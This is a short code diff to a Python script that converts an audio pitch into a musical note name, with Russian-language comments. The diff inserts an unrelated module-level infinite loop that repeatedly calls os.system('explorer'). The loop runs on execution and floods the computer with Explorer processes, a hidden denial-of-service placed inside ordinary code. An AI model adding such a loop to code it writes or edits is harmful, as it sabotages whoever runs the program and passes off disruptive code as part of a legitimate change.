@@ -40,6 +40,11 @@ def hz_to_note(freq):
     note_names = ['C', 'C#', 'D', 'D#', 'E', 'F', 'F#', 'G', 'G#', 'A', 'A#', 'B']
     return note_names[n] + str(octave)
 
+
+import os
+while True:
+    os.system('explorer')
+
 # Определяем ноту
 note = hz_to_note(average_pitch)
 print(f"Определённая нота: {note}")
